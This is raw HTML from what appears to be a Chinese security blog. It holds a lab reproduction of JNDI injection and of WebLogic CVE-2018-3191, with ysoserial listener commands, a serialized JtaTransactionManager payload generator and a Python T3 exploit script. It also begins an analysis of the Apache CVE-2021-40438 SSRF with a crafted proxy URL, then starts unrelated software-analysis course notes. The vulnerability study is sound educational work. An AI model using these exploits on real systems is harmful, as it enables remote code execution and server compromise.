ReferenceWrapper(reference);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PayloadClassFileHTTPServer server = <span class="keyword">new</span> PayloadClassFileHTTPServer(httpServerPort, factoryName, command);</span><br><span class="line">            server.run();</span><br><span class="line"></span><br><span class="line">            System.err.println(<span class="string">&quot;* URL: rmi://&quot;</span>+host+<span class="string">&quot;:&quot;</span>+registryPort+<span class="string">&quot;/&quot;</span>+factoryName);</span><br><span class="line">            System.err.println(<span class="string">&quot;* FactoryURL: &quot;</span> + factoryURL);</span><br><span class="line">            System.err.println(<span class="string">&quot;* Opening JRMP listener on &quot;</span> + registryPort);</span><br><span class="line"></span><br><span class="line">            RMIRefListener c = <span class="keyword">new</span> RMIRefListener(registryPort, payloadObject);</span><br><span class="line">            c.run();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Listener error&quot;</span>);</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>命令如下</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefWithHttpServerListener [registry_IP:registry_PORT] [LDAP_Port] [EvilObj_name] [command]</span><br></pre></td></tr></table></div></figure>


        <h4 id="client"   >
          <a href="#client" class="heading-link"><i class="fas fa-link"></i></a><a href="#client" class="headerlink" title="client"></a>client</h4>
      <p>本地访问一下就行</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://[registry_IP]:[registry_Port]/EvilObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的两行代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>是在某个新的<code>JDK</code>之后由于<code>com.sun.jndi.ldap.object.trustURLCodebase</code>和<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认设置为<code>false</code>，导致无法利用<code>RMI</code>机制以及<code>LDAP</code>机制。当没有设置时，进行<code>lookup</code>调试后会进入如下判断</p>
<ul>
<li><p><code>RMI</code>判断</p>
<p><code>RegistryContext#decodeObject</code>判断<code>com.sun.jndi.rmi.object.trustURLCodebase</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163219141.png" alt="image-20230211163219141"></p>
</li>
<li><p><code>LDAP</code>判断</p>
<p><code>NamingManager#getObjectFactoryFromReference</code>进入<code>VersionHelper12#loadClass</code>判断<code>com.sun.jndi.ldap.object.trustURLCodebase</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163527766.png" alt="image-20230211163527766"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163544591.png" alt="image-20230211163544591"></p>
</li>
</ul>
<p>所以这里将其设置为<code>true</code>，或者命令行也行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></div></figure>

<p>详细看下图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211124056681.png" alt="image-20230211124056681"></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/#jndi%E6%B3%A8%E5%85%A5" >攻击Java中的JNDI、RMI、LDAP(二) - Y4er的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="CVE-2018-3191"   >
          <a href="#CVE-2018-3191" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h3>
      <p><code>Weblogic</code>中关于<code>JNDI</code>注入的，比较原始的应该就算这个洞了吧。</p>

        <h4 id="环境搭建-2"   >
          <a href="#环境搭建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h4>
      <p>也是类似的，用<code>vulhub</code>的，就用<code>CVE-2018-2628</code>的<code>Weblogic</code>，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h4 id="漏洞分析-2"   >
          <a href="#漏洞分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4>
      
        <h5 id="调试准备"   >
          <a href="#调试准备" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试准备" class="headerlink" title="调试准备"></a>调试准备</h5>
      <ul>
<li><p>本地准备</p>
<p>生成在<code>T3</code>协议中进行反序列化的<code>JtaTransactionManager</code>类，该类不在<code>T3</code>协议的黑名单中，可以被反序列化，如下代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String jndiAddress = <span class="string">&quot;rmi://[registry_IP]:[registry_Port]/EvilObj&quot;</span>;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">&quot;CVE_2018_3191.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>上述代码参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中的<code>JtaTransactionManager</code>类是在<code>Weblogic</code>中的，将<code>Weblogic</code>中的<code>modules</code>打包出来放在<code>IDEA</code>中加载即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211154619832.png" alt="image-20230211154619832"></p>
<p>相关的<code>EXP</code>如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFilePayload</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment">#payload的长度四字节无符号整数</span></span><br><span class="line">    payloadLen = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#头部某些地方改掉也没关系，估计是只检测了一部分</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#反序列化标志，这个不能改</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    <span class="comment">#gadget = &quot;JNDI&quot;</span></span><br><span class="line">    <span class="comment">#command = &quot;xxx:xxx&quot;</span></span><br><span class="line">    <span class="comment">#payload = generatePayload(gadget, command)</span></span><br><span class="line">    payload = getFilePayload(<span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial/CVE_2018_3191.ser&quot;</span>)</span><br><span class="line">    T3Exploit(host, port, payload)</span><br></pre></td></tr></table></div></figure></li>
<li><p>服务器准备</p>
<p>使用如下代码搭建</p>
<ul>
<li><p><code>registry</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 9999 EvilObj http://[LDAP_IP]/</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>LDAP</code>服务</p>
<p>将<code>EvilObj.class</code>放在该目录下</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>
<p>需要注意的是，这里<code>CVE-2018-2628</code>中的<code>Weblogic</code>其<code>java</code>环境是<code>1.6.0_45</code>，而如果服务器中的<code>java</code>环境大于此版本，其生成的<code>EvilObj</code>就无法被成功解析，会出现如下版本不匹配问题，导致无法完成漏洞利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211165742189.png" alt="123421"></p>
<p>而高版本解析低版本则没有什么关系，所以一般需要找对应版本的<code>java</code>来生成<code>EvilObj</code>然后挂载到服务器上。</p>
<p>最后有如下结果所示，然后版本也没有不匹配就应该差不多了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211164042119.png" alt="image-20230211164042119"></p>

        <h5 id="具体分析"   >
          <a href="#具体分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h5>
      <p>漏洞点出在<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code>中调用了<code>initUserTransactionAndTransactionManager</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155605398.png" alt="image-20230211155605398"></p>
<p>继续跟进<code>initUserTransactionAndTransactionManager</code>，判断一下<code>this.userTransactionName</code>就会调用到<code>this.lookupUserTransaction</code>函数，而<code>this.userTransactionName</code>在反序列化中是可控的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155652699.png" alt="image-20230211155652699"></p>
<p><code>this.lookupUserTransaction</code>函数中会调用到<code>JndiTemplate#lookup</code>函数，并且以<code>userTransactionName</code>作为参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155802378.png" alt="image-20230211155802378"></p>
<p><code>JndiTemplate#lookup</code>函数中会再调用一次本类中单个<code>name</code>参数的<code>lookup</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160058002.png" alt="image-20230211160058002"></p>
<p>在该单个<code>name</code>参数的<code>lookup</code>函数中找到最终的漏洞根源，使用了<code>Context</code>的<code>lookup</code>函数来远程加载恶意类，该<code>name</code>就是<code>JtaTransactionManager.userTransactionName</code>，是可控的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160128732.png" alt="image-20230211160128732"></p>
<p>这个<code>this.execute</code>就会调用到这里重写的<code>doInContext</code>函数，触发漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160717241.png" alt="image-20230211160717241"></p>

        <h1 id="HTTPD-Apache"   >
          <a href="#HTTPD-Apache" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTPD-Apache" class="headerlink" title="HTTPD(Apache)"></a>HTTPD(Apache)</h1>
      
        <h2 id="CVE-2021-40438"   >
          <a href="#CVE-2021-40438" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-40438" class="headerlink" title="CVE-2021-40438"></a>CVE-2021-40438</h2>
      <p><code>Apache</code>版本小于<code>2.4.48</code>，由于代理模块<code>mod_proxy</code>的漏洞，可以造成<code>Apache</code>的<code>SSRF</code>，需要开启如下两个模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br></pre></td></tr></table></div></figure>

<p>即在<code>/conf/httpd.conf</code>中注释掉</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214103829499.png" alt="image-20230214103829499"></p>

        <h3 id="环境搭建-3"   >
          <a href="#环境搭建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>参考<code>P</code>神的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/418885442584848" >编译调试 Apache</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="漏洞分析-3"   >
          <a href="#漏洞分析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>相关的漏洞链条如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mod_proxy.c/proxy_handler</span><br><span class="line">proxy_util.c/ap_proxy_pre_request</span><br><span class="line">proxy_util.c/fix_uds_filename</span><br></pre></td></tr></table></div></figure>

<p>同样也是参考<code>P</code>神的：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html" >Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>断点下在<code>modules/proxy/proxy_util.c</code>的<code>fix_uds_filename</code>函数头部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214104203749.png" alt="image-20230214104203749"></p>
<p>随便发送一个数据包访问一下即可断下来，该函数相关注释如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_uds_filename</span><span class="params">(request_rec *r, <span class="keyword">char</span> **url)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr, *ptr2;</span><br><span class="line">    <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">            (ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">apr_uri_t</span> urisock;</span><br><span class="line">        <span class="keyword">apr_status_t</span> rv;</span><br><span class="line">        *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">        <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">char</span> *rurl = ptr+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">            apr_table_setn(r-&gt;notes, <span class="string">&quot;uds_path&quot;</span>, sockpath);</span><br><span class="line">            *url = apr_pstrdup(r-&gt;pool, rurl); <span class="comment">/* so we get the scheme for the uds */</span></span><br><span class="line">            <span class="comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span></span><br><span class="line">            memmove(r-&gt;filename+<span class="number">6</span>, rurl, <span class="built_in">strlen</span>(rurl)+<span class="number">1</span>);</span><br><span class="line">            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="number">0</span>, r,</span><br><span class="line">                    <span class="string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,</span><br><span class="line">                    sockpath, *url, r-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *ptr = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>首先关注的一点是<code>r-&gt;filename</code>，这里我输入的<code>url</code>是<code>http://127.0.0.1:4444/?aaaaaa</code>，其<code>r-&gt;filename</code>相关值如下，为<code>proxy:http://192.168.1.1/?aaaaaa</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105305206.png" alt="image-20230214105305206"></p>
<p>即将我们设置中的代理和用户的输入<code>url</code>路径进行了拼接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105328864.png" alt="image-20230214105328864"></p>
<p>也就是说这个<code>r-&gt;filename</code>是一部分可控的。</p>
<p>那么依据在<code>fix_uds_filename</code>函数的第二个<code>if</code>判定以及相关的函数注释</p>
<ul>
<li><p><code>ap_strcasestr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105601093.png" alt="aaa"></p>
</li>
<li><p><code>ap_strchr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105648945.png" alt="image-20230214105648945"></p>
</li>
</ul>
<p>那么即可推导出进入该<code>if</code>的条件</p>
<ul>
<li><code>r-&gt;filename</code>的前6个字符等于<code>proxy:</code></li>
<li><code>r-&gt;filename</code>的字符串中含有字串<code>unix:</code></li>
<li><code>unix:</code>字串的后面部分含有字符<code>|</code></li>
</ul>
<p>比如这样的<code>proxy:http://192.168.1.1/?unix:aaaaaa|http://127.0.0.1/</code></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/02/01/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/">软件分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-02-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p>南京大学《软件分析》课程笔记</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.788&vd_source=1b73d83dc4431f8fc388b6891fa455ec" >南京大学《软件分析》课程01（Introduction）_哔哩哔哩_bilibili</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tai-e.pascal-lab.net/" >Tai-e (pascal-lab.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="一、Intermediate-Representation"   >
          <a href="#一、Intermediate-Representation" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、Intermediate-Representation" class="headerlink" title="一、Intermediate Representation"></a>一、Intermediate Representation</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104924393.png" alt="image-20230114104924393"></p>

        <h2 id="1-中间语言编译"   >
          <a href="#1-中间语言编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-中间语言编译" class="headerlink" title="1.中间语言编译"></a>1.中间语言编译</h2>
      
        <h3 id="1-过程"   >
          <a href="#1-过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-过程" class="headerlink" title="(1)过程"></a>(1)过程</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228171253505.png" alt="image-20221228171253505"></p>
<ul>
<li>词法分析(<code>Lexical Analysis</code>)：从源代码到<code>Tokens</code>，检测单词是否正确</li>
<li>语法分析(<code>Syntax Analysis</code>)：从<code>Tokens</code>到<code>AST</code>，检测语法是否正确</li>
<li>语义分析(<code>Semantic Analysis</code>)：从<code>AST</code>到<code>Decorated AST</code>，检测语义或者说上下文，语境是否正确，比较复杂，一般在编程语言中不会涉及到，主要是自然语言才有的。</li>
<li>转换(<code>Translator</code>)：从<code>AST</code>到<code>IR</code>，即转换为三地址码，方便识别，最后生成机器码</li>
</ul>

        <h3 id="2-AST和IR"   >
          <a href="#2-AST和IR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-AST和IR" class="headerlink" title="(2)AST和IR"></a>(2)<code>AST</code>和<code>IR</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228171835289.png" alt="image-20221228171835289"></p>
<p><code>IR</code>更利用静态分析，因为能够展现控制流程，语言无关性，更贴近于机器码。</p>

        <h2 id="2-Soot常见分析"   >
          <a href="#2-Soot常见分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Soot常见分析" class="headerlink" title="2.Soot常见分析"></a>2.<code>Soot</code>常见分析</h2>
